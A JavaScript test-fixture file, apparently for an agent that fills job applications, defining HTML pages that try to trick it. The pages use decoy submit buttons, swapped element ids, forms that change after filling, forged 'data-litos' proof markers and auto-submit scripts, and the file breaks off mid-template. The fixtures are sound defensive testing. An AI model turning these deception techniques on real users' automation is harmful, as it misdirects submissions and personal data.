const FILL_BY_PHONE_FORMAT = `<!doctype html><meta charset="utf-8"><title>Application phone formatting</title>
<form id="application_form" novalidate>
  <div><label for="formatted-phone">Phone</label><input id="formatted-phone" name="phone" type="tel"></div>
  <label for="phone-resume">Resume</label><input id="phone-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('formatted-phone').addEventListener('input', function (event) {
    if (event.currentTarget.value === '2135746270') event.currentTarget.value = '(213) 574-6270';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('formatted-phone');
  });
</script>`;

const FILL_BY_INFERRED_PHONE_FORMAT = FILL_BY_PHONE_FORMAT
  .replace('type="tel"', 'type="text" inputmode="tel"');

const FILL_BY_SELECT_LABEL = `<!doctype html><meta charset="utf-8"><title>Application select label</title>
<form id="application_form" novalidate>
  <div><label for="department">Department</label><select id="department" name="department">
    <option value="">Choose</option><option value="eng" label="Engineering">Engineering department</option>
  </select></div>
  <label for="select-resume">Resume</label><input id="select-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="mutate-select-label" type="button">Mutate label</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('mutate-select-label').addEventListener('click', function () {
    document.querySelector('#department option[value="eng"]').label = 'Different department';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('select-label');
  });
</script>`;

const FILL_BY_SELECT_PUNCTUATION = `<!doctype html><meta charset="utf-8"><title>Application select punctuation</title>
<form id="application_form" novalidate>
  <div><label for="experience-band">Experience</label><select id="experience-band" name="experience_band">
    <option value="">Choose</option><option value="10+">10+</option>
  </select></div>
  <label for="punctuation-resume">Resume</label><input id="punctuation-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('select-punctuation');
  });
</script>`;

const FILL_BY_DATE_NORMALIZATION = `<!doctype html><meta charset="utf-8"><title>Application date normalization</title>
<form id="application_form" novalidate>
  <div><label for="graduation-date">Graduation date</label><input id="graduation-date" name="graduation_date" type="date"></div>
  <label for="date-resume">Resume</label><input id="date-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="mutate-date" type="button">Mutate date</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('mutate-date').addEventListener('click', function () {
    document.getElementById('graduation-date').value = '2028-06-01';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('date-normalization');
  });
</script>`;

const FILL_BY_INFERRED_DATE_NORMALIZATION = FILL_BY_DATE_NORMALIZATION
  .replace('type="date"', 'type="text" placeholder="Pick date"');

const WORKABLE_ROLE_SEND = WORKABLE_BARE_SEND
  .replace('<button id="send" type="submit">Send</button>', '<div id="send" role="button" tabindex="0">Send</div>')
  .replace("document.getElementById('application').addEventListener('submit'", "document.getElementById('send').addEventListener('click'");

const WORKABLE_EXPLICIT_ROLE = WORKABLE_BARE_SEND
  .replace('<button id="send" type="submit">Send</button>', '<div id="send" role="button" tabindex="0">Submit application</div>')
  .replace("document.getElementById('application').addEventListener('submit'", "document.getElementById('send').addEventListener('click'")
  .replace("record('workable');", "record('explicit-role');");

const WORKABLE_FORM_ACTION_OVERRIDE = WORKABLE_BARE_SEND
  .replace('<button id="send" type="submit">Send</button>', '<button id="send" type="submit" formaction="/contact">Send</button>');

const WORKABLE_EXPLICIT_OVERRIDE = WORKABLE_BARE_SEND
  .replace(
    '<form id="application" action="/jobs/application" novalidate>',
    '<form id="application" action="/jobs/application" enctype="multipart/form-data">'
  )
  .replace(
    '<button id="send" type="submit">Send</button>',
    '<button id="send" type="submit" formaction="/jobs/alternate" formmethod="post">Submit application</button>'
  );

const WORKABLE_FORM_TARGET = WORKABLE_BARE_SEND
  .replace('<form id="application" action="/jobs/application" novalidate>', '<form id="application" action="/jobs/application" target="_blank" novalidate>');

const WORKABLE_BASE_TARGET = WORKABLE_BARE_SEND
  .replace('<title>Workable application</title>', '<base target="_blank"><title>Workable application</title>');

const WORKABLE_ASSOCIATION_DECOY = WORKABLE_BARE_SEND
  .replace(
    '<form id="application" action="/jobs/application" novalidate>',
    '<form id="support" action="/support" novalidate></form><form id="application" action="/jobs/application" novalidate>'
  )
  .replace('<button id="send" type="submit">Send</button>', '<button id="send" type="submit" form="support">Send</button>')
  .replace('</script>', `
  document.getElementById('support').addEventListener('submit', function (event) {
    event.preventDefault(); record('association-decoy');
  });
</script>`);

const WORKABLE_CONTROL_STATE_DRIFT = WORKABLE_BARE_SEND
  .replace('</form>', '</form><button id="mutate-control-state" type="button">Mutate controls</button>')
  .replace('</script>', `
  document.getElementById('mutate-control-state').addEventListener('click', function () {
    document.getElementById('email').readOnly = true;
    document.getElementById('resume').disabled = true;
  });
</script>`);

const WORKABLE_AMBIGUOUS_SEND = WORKABLE_BARE_SEND
  .replace('<button id="send" type="submit">Send</button>', '<button id="send-a" type="submit">Send</button><button id="send-b" type="submit">Send</button>');

const WORKABLE_EXPLICIT_WINS = WORKABLE_BARE_SEND
  .replace('<button id="send" type="submit">Send</button>', '<button id="send" type="submit">Send</button><button id="explicit" type="button">Send application</button>')
  .replace("document.getElementById('application').addEventListener('submit', function (event) {", "document.getElementById('explicit').addEventListener('click', function (event) {")
  .replace("record('workable');", "record('explicit');");

const WORKABLE_FORM_DRIFT = WORKABLE_BARE_SEND
  .replace('</form>', '</form><button id="rerender" type="button">Refresh form</button>')
  .replace('</script>', `
  document.getElementById('rerender').addEventListener('click', function () {
    var current = document.getElementById('application');
    var replacement = current.cloneNode(true);
    replacement.addEventListener('submit', function (event) {
      event.preventDefault();
      record('drifted-workable');
    });
    current.replaceWith(replacement);
  });
</script>`);

const WORKABLE_PROOF_LOSS_EXPLICIT_DECOY = `<!doctype html><meta charset="utf-8"><title>Bound application proof loss</title>
<form id="decoy" action="/newsletter" novalidate>
  <input name="email" value="news@example.com">
  <button id="decoy-submit" type="submit">Submit application</button>
</form>
<form id="application" action="/jobs/application" novalidate>
  <label for="first-name">First name *</label><input id="first-name" name="first_name" required>
  <label for="last-name">Last name *</label><input id="last-name" name="last_name" required>
  <label for="email">Email *</label><input id="email" name="email" type="email" required>
  <label for="resume">Resume *</label><input id="resume" name="resume" type="file" required>
  <button id="send" type="submit">Send</button>
</form>
<button id="drop-proofs" type="button">Refresh application</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('decoy').addEventListener('submit', function (event) {
    event.preventDefault(); record('explicit-decoy');
  });
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault(); record('original-application');
  });
  document.getElementById('drop-proofs').addEventListener('click', function () {
    var current = document.getElementById('application');
    var replacement = current.cloneNode(true);
    replacement.addEventListener('submit', function (event) {
      event.preventDefault(); record('replacement-application');
    });
    current.replaceWith(replacement);
  });
</script>`;

const activationDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Activation drift</title>
<form id="application" method="post" action="/record-click?who=activation-native" enctype="multipart/form-data">
  <label for="first-name">First name</label><input id="first-name" name="first_name">
  <label for="last-name">Last name</label><input id="last-name" name="last_name">
  <label for="email">Email</label><input id="email" name="email" type="email">
  <label for="resume">Resume</label><input id="resume" name="resume" type="file">
  <input id="activation-job-id" name="job_id" type="hidden" value="A">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  var activationSend = document.getElementById('send');
  if (` + JSON.stringify(mode) + ` === 'pointer') {
    activationSend.addEventListener('pointerdown', function () {
      document.getElementById('activation-job-id').value = 'B';
    });
    activationSend.addEventListener('click', function () { record('pointer-direct-transmit'); });
  } else {
    activationSend.addEventListener('click', function () {
      document.getElementById('activation-job-id').value = 'B';
      record('click-direct-transmit');
    });
  }
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault(); record('activation-submit-transmit');
  });
</script>`;

const PRE_CHOOSER_AUTO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Pre-chooser transport containment</title>
<form id="application" method="post" action="/record-click?who=prechooser-native" enctype="multipart/form-data" novalidate>
  <label for="first-name">First name</label><input id="first-name" name="first_name">
  <label for="last-name">Last name</label><input id="last-name" name="last_name">
  <label for="email">Email</label><input id="email" name="email" type="email">
  <label for="resume">Resume</label><input id="resume" name="resume" type="file">
  <label for="prechooser-select">Location</label><select id="prechooser-select" name="location">
    <option value="">Choose</option><option value="Dubai">Dubai</option>
  </select>
  <button id="send-a" type="submit">Send</button><button id="send-b" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  var prechooserForm = document.getElementById('application');
  document.getElementById('email').addEventListener('input', function () {
    fetch('/record-click?who=prechooser-fill-fetch', { method: 'POST', body: 'field=email' }).catch(function () {});
    prechooserForm.requestSubmit(document.getElementById('send-a'));
  });
  document.getElementById('resume').addEventListener('change', function () {
    var request = new XMLHttpRequest();
    request.open('POST', '/record-click?who=prechooser-upload-xhr');
    request.send('field=resume');
  });
  document.getElementById('prechooser-select').addEventListener('change', function () {
    navigator.sendBeacon('/record-click?who=prechooser-select-beacon', 'field=location');
  });
  prechooserForm.addEventListener('submit', function (event) {
    event.preventDefault(); record('prechooser-submit-handler');
  });
</script>`;

const JOB_ALERT_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Job alerts</title>
<form id="job-alert" action="/jobs/alerts" novalidate>
  <label for="alert-email">Email</label><input id="alert-email" type="email">
  <label for="keywords">Keywords</label><input id="keywords">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('job-alert').addEventListener('submit', function (event) {
    event.preventDefault(); record('job-alert');
  });
</script>`;

const TALENT_POOL_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Talent network</title>
<form id="talent-network" action="/talent/network" novalidate>
  <label for="talent-name">Name</label><input id="talent-name">
  <label for="talent-email">Email</label><input id="talent-email" type="email">
  <label for="talent-resume">Resume</label><input id="talent-resume" name="resume_file" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('talent-network').addEventListener('submit', function (event) {
    event.preventDefault(); record('talent-pool');
  });
</script>`;

const MINIMAL_FILE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application file drift</title>
<form id="application_form" novalidate>
  <label for="drift-email">Email</label><input id="drift-email" type="email">
  <label for="drift-resume">Resume</label><input id="drift-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="mutate" type="button">Mutate</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('file-drift');
  });
  document.getElementById('mutate').addEventListener('click', function () {
    var input = document.getElementById('drift-resume');
    var original = input.files[0];
    var transfer = new DataTransfer();
    transfer.items.add(new File(['xxxxxx'], original.name, { type: original.type, lastModified: original.lastModified }));
    input.files = transfer.files;
  });
</script>`;

const CHOICE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application choice drift</title>
<form id="candidate_application" novalidate>
  <label for="choice-email">Email</label><input id="choice-email" type="email">
  <label for="choice-name">Name</label><input id="choice-name">
  <label for="choice-resume">Resume</label><input id="choice-resume" name="candidate_resume" type="file">
  <label for="choice-blocker">Required blocker *</label><input id="choice-blocker" required>
  <fieldset><legend>Authorized to work?</legend>
    <label id="yes-label"><input id="yes" name="authorization" type="radio" value="Yes">Yes</label>
    <label><input id="no" name="authorization" type="radio" value="No">No</label>
  </fieldset>
  <button id="send" type="submit">Send</button>
</form><button id="mutate" type="button">Mutate</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('candidate_application').addEventListener('submit', function (event) {
    event.preventDefault(); record('choice-drift');
  });
  document.getElementById('mutate').addEventListener('click', function () {
    document.getElementById('yes').value = 'Maybe';
    document.getElementById('yes-label').lastChild.data = 'Maybe';
  });
</script>`;

const REPARENT_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application reparent drift</title>
<form id="application_source" novalidate>
  <div id="proof-fields">
    <label for="move-email">Email</label><input id="move-email" type="email">
    <label for="move-resume">Resume</label><input id="move-resume" name="resume_file" type="file">
  </div>
  <button id="source-send" type="submit">Send</button>
</form>
<form id="candidate_application" novalidate><button id="target-send" type="submit">Send</button></form>
<button id="mutate" type="button">Mutate</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_source').addEventListener('submit', function (event) {
    event.preventDefault(); record('source');
  });
  document.getElementById('candidate_application').addEventListener('submit', function (event) {
    event.preventDefault(); record('target');
  });
  document.getElementById('mutate').addEventListener('click', function () {
    document.getElementById('candidate_application').prepend(document.getElementById('proof-fields'));
  });
</script>`;

const confirmationDriftPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Application confirmation drift</title>
<form id="application_form" novalidate>
  <label for="confirm-email">Email *</label><input id="confirm-email" type="email" required aria-invalid="true">
  <label for="confirm-resume">Resume</label><input id="confirm-resume" name="candidate_resume" type="file">
  ` + (mode === 'hidden' ? '<input id="job-id" type="hidden" name="job_id" value="csrf-low-entropy-secret">' : '') + `
  ` + (mode === 'consent' ? '<label><input id="optional-consent" type="checkbox" name="optional_consent" value="yes"> Optional consent</label>' : '') + `
  <button id="send" type="submit"` + (mode === 'value' ? ' name="action" value="apply"' : '') + `>Send</button>
  ` + (mode === 'sibling' ? '<button id="sibling" type="submit">Cancel</button>' : '') + `
</form>` + (mode === 'external-hidden'
  ? '<input id="external-job-id" type="hidden" form="application_form" name="job_id" value="external-job-secret">'
  : '') + `<button id="arm" type="button">Arm update</button><div id="submitted"></div>
<script>${HELPERS}
  var armed = false;
  document.getElementById('arm').addEventListener('click', function () { armed = true; });
  document.getElementById('confirm-email').addEventListener('input', function () {
    if (!armed) return;
    armed = false;
    if (document.getElementById('sibling')) {
      document.getElementById('sibling').textContent = 'Send';
    } else if (` + JSON.stringify(mode) + ` === 'value') {
      document.getElementById('send').value = 'withdraw';
    } else if (` + JSON.stringify(mode) + ` === 'class') {
      document.getElementById('application_form').classList.add('validated');
    } else if (` + JSON.stringify(mode) + ` === 'hidden') {
      document.getElementById('job-id').value = 'csrf-low-entropy-changed';
    } else if (` + JSON.stringify(mode) + ` === 'external-hidden') {
      document.getElementById('external-job-id').value = 'external-job-changed';
    } else if (` + JSON.stringify(mode) + ` === 'consent') {
      document.getElementById('optional-consent').checked = true;
    } else {
      var transfer = new DataTransfer();
      transfer.items.add(new File(['changed'], 'changed.pdf', { type: 'application/pdf', lastModified: 2 }));
      document.getElementById('confirm-resume').files = transfer.files;
    }
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('confirmation-drift');
  });
</script>`;

const OVER_BOUND_SUBMITTED_STATE = `<!doctype html><meta charset="utf-8"><title>Over-bound application state</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="bound-email">Email *</label><input id="bound-email" name="email" type="email" required>
  <label for="bound-resume">Resume</label><input id="bound-resume" name="candidate_resume" type="file">
  ${Array.from({ length: 513 }, (_, index) => '<input type="hidden" name="state_' + index + '" value="A">').join('')}
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>`;

const FORGED_SUCCESS_MARKERS = `<!doctype html><meta charset="utf-8"><title>Forged proof markers</title>
<form id="application_form" novalidate>
  <label for="forged-email">Email</label><input id="forged-email" type="email" value="attacker@example.com" data-litos-successful-address-v1="forged">
  <label for="forged-resume">Resume</label><input id="forged-resume" name="candidate_resume" type="file" data-litos-successful-address-v1="forged">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  attach('forged-resume');
  var forged = [document.getElementById('forged-email'), document.getElementById('forged-resume')];
  new MutationObserver(function () {
    forged.forEach(function (control) {
      if (!control.hasAttribute('data-litos-successful-address-v1')) {
        control.setAttribute('data-litos-successful-address-v1', 'forged');
      }
    });
  }).observe(document.getElementById('application_form'), { subtree: true, attributes: true });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('forged-proof');
  });
</script>`;

const WORKABLE_EXTERNAL_SUBMIT = WORKABLE_BARE_SEND
  .replace('<form id="application"', '<form id="newsletter"><input name="name" value="News"><input name="email" value="news@example.com"><button id="newsletter-submit" type="submit">Submit</button></form><form id="application"')
  .replace('</script>', `
  document.getElementById('newsletter').addEventListener('submit', function (event) {
    event.preventDefault(); record('newsletter-submit');
  });
</script>`);

const WORKABLE_DISABLED_WITH_EXTERNAL_SUBMIT = WORKABLE_EXTERNAL_SUBMIT
  .replace('<button id="send" type="submit">Send</button>', '<button id="send" type="submit" disabled>Send</button>');

const WORKABLE_EXPLICIT_ASSOCIATED_DECOY = WORKABLE_BARE_SEND
  .replace(
    '<form id="application" action="/jobs/application" novalidate>',
    '<form id="support" action="/support" novalidate></form><form id="application" action="/jobs/application" novalidate>'
  )
  .replace('<button id="send" type="submit">Send</button>', '<button id="wrong-explicit" type="submit" form="support">Submit application</button><button id="send" type="submit">Send</button>')
  .replace('</script>', `
  document.getElementById('support').addEventListener('submit', function (event) {
    event.preventDefault(); record('explicit-associated-decoy');
  });
</script>`);

const DIRECT_MARKER_REDIRECT = `<!doctype html><meta charset="utf-8"><title>Direct submit handles</title>
<form id="decoy-form"><input name="message" value="decoy"><button id="decoy-submit" type="submit">Cancel</button></form>
<form id="application_form" novalidate>
  <label for="direct-email">Email</label><input id="direct-email" type="email" value="applicant@example.com">
  <label for="direct-resume">Resume</label><input id="direct-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  attach('direct-resume');
  var moving = false;
  new MutationObserver(function (mutations) {
    if (moving) return;
    moving = true;
    mutations.forEach(function (mutation) {
      var attribute = mutation.attributeName;
      var value = mutation.target.getAttribute(attribute);
      if (!value) return;
      if (attribute === 'data-litos-submit-candidate-v2' && mutation.target.id === 'send') {
        mutation.target.removeAttribute(attribute);
        document.getElementById('decoy-submit').setAttribute(attribute, value);
      }
      if (attribute === 'data-litos-submit-scope-v2' && mutation.target.id === 'application_form') {
        mutation.target.removeAttribute(attribute);
        document.getElementById('decoy-form').setAttribute(attribute, value);
      }
    });
    moving = false;
  }).observe(document.documentElement, {
    subtree: true,
    attributes: true,
    attributeFilter: ['data-litos-submit-candidate-v2', 'data-litos-submit-scope-v2']
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('direct-real');
  });
  document.getElementById('decoy-form').addEventListener('submit', function (event) {
    event.preventDefault(); record('direct-decoy');
  });
</script>`;

const FORMLESS_STATE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Formless state drift</title>
<div id="form">
  <input id="container-job-id" type="hidden" name="job_id" value="A">
  <label for="container-email">Email *</label><input id="container-email" type="email" required aria-invalid="true">
  <label for="container-resume">Resume</label><input id="container-resume" name="candidate_resume" type="file">
  <button id="send" type="button">Submit application</button>
</div><button id="arm-container" type="button">Arm</button><div id="submitted"></div>
<script>${HELPERS}
  var containerArmed = false;
  document.getElementById('arm-container').addEventListener('click', function () { containerArmed = true; });
  document.getElementById('container-email').addEventListener('input', function () {
    if (!containerArmed) return;
    containerArmed = false;
    document.getElementById('container-job-id').value = 'B';
  });
  document.getElementById('send').addEventListener('click', function () { record('formless-state'); });
</script>`;

const EXTERNAL_ASSOCIATED_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>External associated application</title>
<form id="application_form" action="/jobs/application" novalidate><button id="send" type="submit">Send</button></form>
<label for="external-email">Email</label><input id="external-email" form="application_form" name="email" type="email">
<label for="external-resume">Resume</label><input id="external-resume" form="application_form" name="candidate_resume" type="file">
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('external-associated');
  });
</script>`;

const PRE_CHOOSER_BASE_DRIFT = `<!doctype html><meta charset="utf-8"><base id="proof-base" href="/initial/"><title>Proof base drift</title>
<form id="application_form" action="jobs/application" method="post" enctype="multipart/form-data" novalidate>
  <label for="proof-email">Email</label><input id="proof-email" type="email">
  <label for="proof-resume">Resume</label><input id="proof-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="mutate-proof" type="button">Mutate</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('mutate-proof').addEventListener('click', function () {
    document.getElementById('proof-base').href = '/changed/';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('pre-base-drift');
  });
</script>`;

const PRE_CHOOSER_METHOD_DRIFT = PRE_CHOOSER_BASE_DRIFT
  .replace("document.getElementById('proof-base').href = '/changed/';", "document.getElementById('application_form').method = 'get';")
  .replace("record('pre-base-drift');", "record('pre-method-drift');");

const SELECTOR_ID_TRANSFER = `<!doctype html><meta charset="utf-8"><title>Selector identity transfer</title>
<form id="application_source"><label for="transfer-email">Applicant email</label><input id="transfer-email" type="email"></form>
<form id="contact_decoy"><input id="decoy-email" type="email" value="decoy@example.com"><button id="decoy-submit" type="submit">Submit</button></form>
<button id="transfer-id" type="button">Transfer id</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('transfer-id').addEventListener('click', function () {
    document.getElementById('transfer-email').id = 'former-transfer-email';
    document.getElementById('decoy-email').id = 'transfer-email';
  });
  document.getElementById('contact_decoy').addEventListener('submit', function (event) {
    event.preventDefault(); record('selector-decoy');
  });
</script>`;

const failedChoicePage = (replaceFailedControl) => `<!doctype html><meta charset="utf-8"><title>Failed choice authority</title>
<form id="application_form" novalidate>
  <label for="failed-email">Email</label><input id="failed-email" type="email">
  <label for="failed-resume">Resume</label><input id="failed-resume" name="candidate_resume" type="file">
  <div id="authorization-question" class="field select__container">
    <label for="authorization">Work authorization</label>
    <div class="select__control"><div id="authorization-value" class="select__single-value" style="display:none"></div>
      <input id="authorization" role="combobox" aria-haspopup="listbox" aria-controls="authorization-options"></div>
  </div>
  <div id="authorization-options" role="listbox" style="display:none">
    <div id="wrong-authorization" role="option">Yes, definitely</div>
  </div>
  <button id="send" type="submit">Send</button>
</form><button id="replace-failed" type="button">Replace failed choice</button><div id="submitted"></div>
<script>${HELPERS}
  var question = document.getElementById('authorization-question');
  new MutationObserver(function () {
    if (question.hasAttribute('data-litos-unverified-choice')) {
      question.removeAttribute('data-litos-unverified-choice');
      if (` + JSON.stringify(replaceFailedControl) + `) {
        var replacement = question.cloneNode(true);
        replacement.querySelector('#authorization-value').style.display = '';
        replacement.querySelector('#authorization-value').textContent = 'No';
        question.replaceWith(replacement);
        question = replacement;
      }
    }
  }).observe(question, { attributes: true, attributeFilter: ['data-litos-unverified-choice'] });
  document.getElementById('authorization').addEventListener('click', function () {
    document.getElementById('authorization-options').style.display = '';
    this.setAttribute('aria-expanded', 'true');
  });
  document.getElementById('wrong-authorization').addEventListener('click', function () {
    var value = document.getElementById('authorization-value');
    value.style.display = '';
    value.textContent = 'No';
    document.getElementById('authorization-options').style.display = 'none';
    document.getElementById('authorization').setAttribute('aria-expanded', 'false');
  });
  document.getElementById('replace-failed').addEventListener('click', function () {
    if (!` + JSON.stringify(replaceFailedControl) + `) return;
    var current = document.getElementById('authorization-question');
    var replacement = current.cloneNode(true);
    replacement.querySelector('#authorization-value').style.display = '';
    replacement.querySelector('#authorization-value').textContent = 'No';
    current.replaceWith(replacement);
    question = replacement;
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('failed-choice');
  });
</script>`;

const EXTERNAL_REQUIRED_CONTROL = `<!doctype html><meta charset="utf-8"><title>External required control</title>
<form id="application_form" action="/jobs/application" novalidate>
  <label for="external-required-email">Email</label><input id="external-required-email" type="email">
  <label for="external-required-resume">Resume</label><input id="external-required-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form>
<label for="external-required-answer">Employer question *</label>
<input id="external-required-answer" form="application_form" name="employer_answer" required>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('external-required');
  });
</script>`;

const WHOLE_FORM_FAILED_CHOICE = `<!doctype html><meta charset="utf-8"><title>Whole form failed choice</title>
<div id="form-host"><form id="application_form" novalidate>
  <div id="whole-question" class="field select__container">
    <label for="whole-choice">Work authorization</label>
    <div class="select__control"><div id="whole-value" class="select__single-value" style="display:none"></div>
      <input id="whole-choice" role="combobox" aria-haspopup="listbox" aria-controls="whole-options"></div>
  </div>
  <div id="whole-options" role="listbox" style="display:none">
    <div id="whole-wrong" role="option">Yes, definitely</div>
  </div>
  <button id="send" type="submit">Submit application</button>
</form></div>
<button id="replace-whole-form" type="button">Replace form</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('whole-choice').addEventListener('click', function () {
    document.getElementById('whole-options').style.display = '';
    this.setAttribute('aria-expanded', 'true');
  });
  document.getElementById('whole-wrong').addEventListener('click', function () {
    var value = document.getElementById('whole-value');
    value.style.display = '';
    value.textContent = 'No';
    document.getElementById('whole-options').style.display = 'none';
    document.getElementById('whole-choice').setAttribute('aria-expanded', 'false');
  });
  document.getElementById('replace-whole-form').addEventListener('click', function () {
    var current = document.getElementById('application_form');
    current.replaceWith(current.cloneNode(true));
  });
  document.addEventListener('submit', function (event) {
    if (event.target.id !== 'application_form') return;
    event.preventDefault(); record('whole-form-choice');
  });
</script>`;

const V3_DETACHED_UNRELATED_FAILED_CHOICE = `<!doctype html><meta charset="utf-8"><title>V3 detached unrelated failed choice</title>
<form id="application_form" novalidate>
  <label for="v3-cross-email">Email</label><input id="v3-cross-email" type="email">
  <label for="v3-cross-resume">Resume</label><input id="v3-cross-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form>
<div id="secondary-host"><form id="secondary_form" novalidate>
  <div id="secondary-question" class="field select__container">
    <label for="secondary-choice">Secondary preference</label>
    <div class="select__control"><div id="secondary-value" class="select__single-value" style="display:none"></div>
      <input id="secondary-choice" role="combobox" aria-haspopup="listbox" aria-controls="secondary-options"></div>
  </div>
  <div id="secondary-options" role="listbox" style="display:none">
    <div id="secondary-wrong" role="option">Yes, definitely</div>
  </div>
</form></div>
<button id="remove-secondary" type="button">Remove secondary form</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('secondary-choice').addEventListener('click', function () {
    document.getElementById('secondary-options').style.display = '';
    this.setAttribute('aria-expanded', 'true');
  });
  document.getElementById('secondary-wrong').addEventListener('click', function () {
    var value = document.getElementById('secondary-value');
    value.style.display = '';
    value.textContent = 'No';
    document.getElementById('secondary-options').style.display = 'none';
    document.getElementById('secondary-choice').setAttribute('aria-expanded', 'false');
  });
  document.getElementById('remove-secondary').addEventListener('click', function () {
    document.getElementById('secondary-host').remove();
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('v3-application');
  });
</script>`;

const actionTargetSwapPage = (kind) => {
  const isSelect = kind === 'select';
  const isUpload = kind === 'upload';
  const target = isSelect
    ? '<select id="swap-target"><option value="">Choose</option><option value="yes">Yes</option></select>'
    : isUpload
      ? '<input id="swap-target" name="candidate_resume" type="file">'
      : '<input id="swap-target" placeholder="Applicant value">';
  const decoy = isSelect
    ? '<select id="decoy-target"><option value="">Choose</option><option value="yes">Yes</option></select>'
    : isUpload
      ? '<input id="decoy-target" name="candidate_resume" type="file">'
      : '<input id="decoy-target" placeholder="Applicant value">';
  return `<!doctype html><meta charset="utf-8"><title>Exact ${kind} target</title>
<form id="application_form" novalidate>
  <div id="swap-question"><label for="swap-target">Applicant value</label>${target}</div>
  <label for="stable-email">Email</label><input id="stable-email" type="email">
  <label for="stable-resume">Resume</label><input id="stable-resume" name="candidate_resume" type="file">
  <input id="shape-field" value="shape">
  <button id="send" type="submit">Send</button>
</form>
<form id="source_form">${decoy}</form><div id="submitted"></div>
<script>${HELPERS}
  var original = document.getElementById('swap-target');
  var decoy = document.getElementById('decoy-target');
  var swapped = false;
  function swapTargets() {
    if (swapped) return;
    swapped = true;
    var placeholder = document.createComment('swap');
    original.replaceWith(placeholder);
    decoy.replaceWith(original);
    placeholder.replaceWith(decoy);
    original.id = 'former-swap-target';
    decoy.id = 'swap-target';
  }
  if (` + JSON.stringify(kind === 'fill' || kind === 'fillByLabelText') + `) {
    var nativeGetAttribute = original.getAttribute.bind(original);
    original.getAttribute = function (name) {
      var value = nativeGetAttribute(name);
      if (name === 'placeholder' && !swapped) setTimeout(swapTargets, 0);
      return value;
    };
  }
  if (` + JSON.stringify(isSelect) + `) {
    original.addEventListener('change', function () {
      var selected = original.value;
      swapTargets();
      decoy.value = selected;
    });
  }
  if (` + JSON.stringify(isUpload) + `) {
    original.addEventListener('change', function () {
      var copied = new DataTransfer();
      for (var file of original.files) copied.items.add(file);
      swapTargets();
      decoy.files = copied.files;
    });
  }
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('${kind}-target-swap');
  });
</script>`;
};

const CUSTOM_SUBMIT_CHOICE = `<!doctype html><meta charset="utf-8"><title>Custom choice submit guard</title>
<form id="application_form" novalidate>
  <label for="custom-email">Email</label><input id="custom-email" type="email">
  <label for="custom-resume">Resume</label><input id="custom-resume" name="candidate_resume" type="file">
  <div id="custom-question" aria-required="true" aria-invalid="true">
    <span>Work authorization</span><button id="custom-selected" class="_selected_choice">Yes</button>
  </div>
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('custom-submit-choice');
  });
</script>`;

const lateChooserReparentPage = (explicit) => `<!doctype html><meta charset="utf-8"><title>Late chooser reparent</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
